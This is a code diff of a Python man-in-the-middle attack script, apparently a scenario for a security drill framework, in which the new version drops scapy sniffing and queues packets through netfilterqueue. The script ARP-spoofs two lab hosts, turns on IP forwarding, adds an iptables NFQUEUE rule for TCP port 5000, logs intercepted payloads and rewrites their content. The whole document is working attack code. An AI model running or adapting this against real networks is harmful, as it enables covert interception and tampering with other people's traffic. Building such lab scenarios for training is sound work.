@@ -2,37 +2,42 @@
 scenario entrypoint for mitm.
 """
 
-import sys
+from typing import Callable
 
 from scapy.layers.inet import TCP, IP
-from scapy.layers.l2 import Ether
-from scapy.packet import Raw, Packet
-from scapy.sendrecv import sendp
-
-from nsak.core import DrillManager
+from scapy.packet import Raw, Packet as ScapyPacket
+from netfilterqueue import NetfilterQueue, Packet
 
 import subprocess
-import threading
-from scapy.all import send, sniff, get_if_hwaddr
+from scapy.all import get_if_hwaddr
 
 ALICE_IP = "10.10.10.20"
 BOB_IP = "10.10.10.30"
 ATTACKER_IFACE = "eth0"
 ATTACKER_MAC = get_if_hwaddr(ATTACKER_IFACE)
 
-def enable_ip_forwarding():
-    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-        f.write("1")
+def set_ip_forwarding(value: bool) -> None:
+    """
+    Set ip forwarding on the system.
 
-def disable_ip_forwarding():
+    :param value:
+    :return:
+    """
+    str_value = "1" if value else "0"
     with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-        f.write("0")
+        f.write(str_value)
 
-def print_packet(pkt: Packet):
-    if IP in pkt and TCP in pkt:
-        src = pkt[IP].src
-        dst = pkt[IP].dst
-        payload = bytes(pkt[TCP].payload)
+def print_packet(ip: ScapyPacket) -> None:
+    """
+
+
+    :param ip:
+    :return:
+    """
+    if IP in ip and TCP in ip:
+        src = ip[IP].src
+        dst = ip[IP].dst
+        payload = bytes(ip[TCP].payload)
         if payload:
             try:
                 payload = payload.decode(errors="replace")
@@ -40,52 +45,78 @@ def print_packet(pkt: Packet):
                 payload = "<binary>"
             print(f"[MITM] {src} → {dst}: {payload}", flush=True)
 
-def manipulate(pkt: Packet):
-    if pkt[Ether].src == ATTACKER_MAC:
-        # Do not process packets sent by malcom
-        return
-    # print("[+] Received packet...")
-    print_packet(pkt)
-    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
-        print("[+] Packet does not contain IP or TCP layer, forwarding...", flush=True)
-        return
+def manipulate_packet(packet: Packet) -> None:
+    """
+    Intercept and manipulate packets.
 
-    if pkt.haslayer(Raw):
+    :param packet:
+    :return:
+    """
+    ip = IP(packet.get_payload())
+
+    # print("[+] Received packet...")
+    print_packet(ip)
+
+    if ip.haslayer(Raw):
         #print("[+] Packet contains raw payload, manipulating...", flush=True)
-        payload: bytes = pkt[Raw].load
+        payload: bytes = ip[Raw].load
         #print(f"[+] Raw payload: {payload} ({type(payload)})", flush=True)
 
-        if b"hello" in payload:
-            print("[+] Modifying packet", flush=True)
+        print("[+] Modifying packet", flush=True)
 
-            new_payload = payload.replace(b"hello", b"HELLO")
+        new_payload = payload.replace(b"says hello", b"H4X0R nsak")
 
-            pkt[Raw].load = new_payload
+        ip[Raw].load = new_payload
 
-            # VERY IMPORTANT: delete checksums & lengths
-            del pkt[IP].len
-            del pkt[IP].chksum
-            del pkt[TCP].chksum
-    else:
-        print("[+] Packet does not contain raw payload, forwarding...", flush=True)
+        del ip[IP].len
+        del ip[IP].chksum
+        del ip[TCP].chksum
 
-    # Forward unmodified packets
-    sendp(pkt, iface=ATTACKER_IFACE, verbose=False)
+    packet.set_payload(bytes(ip))
+    packet.accept()
 
-def sniff_packets():
-    print("[+] Sniffing traffic...")
-    sniff(
-        iface=ATTACKER_IFACE,
-        filter="tcp port 5000",
-        prn=manipulate,
-        store=False,
-        promisc=True,
-    )
+def setup_netfilter_iptables() -> None:
+    """
+    Setup iptables rules for forwarding packets to netfilter queue.
 
+    :return:
+    """
 
-def arp_spoof():
-    subprocess.Popen(["arpspoof", "-i", ATTACKER_IFACE, "-t", ALICE_IP, BOB_IP])
-    subprocess.Popen(["arpspoof", "-i", ATTACKER_IFACE, "-t", BOB_IP, ALICE_IP])
+    subprocess.Popen([
+        "iptables",
+        "-I",
+        "FORWARD",
+        "-p",
+        "tcp",
+        "--dport",
+        "5000",
+        "-j",
+        "NFQUEUE",
+        "--queue-num",
+        "1"
+    ])
+
+def setup_netfilter_queue(packet_handler: Callable[[Packet], None]) -> None:
+    """
+    Setup netfilter queue for intercepting packets.
+
+    :param packet_handler:
+    :return:
+    """
+    netfilter_queue = NetfilterQueue()
+    netfilter_queue.bind(1, packet_handler)
+    netfilter_queue.run()
+
+def arp_spoof(iface: str, target_ip: str, spoof_ip: str) -> None:
+    """
+    Start arp spoofing on the provided interface.
+
+    :param iface:
+    :param target_ip:
+    :param spoof_ip:
+    :return:
+    """
+    subprocess.Popen(["arpspoof", "-i", iface, "-t", target_ip, spoof_ip])
 
 
 def run() -> None:
@@ -94,12 +125,12 @@ def run() -> None:
 
     :return: None
     """
-    #enable_ip_forwarding()
-    #iptables_setup()
 
-    disable_ip_forwarding()
-    arp_spoof()
-    sniff_packets()
+    set_ip_forwarding(True)
+    arp_spoof(ATTACKER_IFACE, ALICE_IP, BOB_IP)
+    arp_spoof(ATTACKER_IFACE, BOB_IP, ALICE_IP)
+    setup_netfilter_iptables()
+    setup_netfilter_queue(manipulate_packet)
 
 
 if __name__ == "__main__":
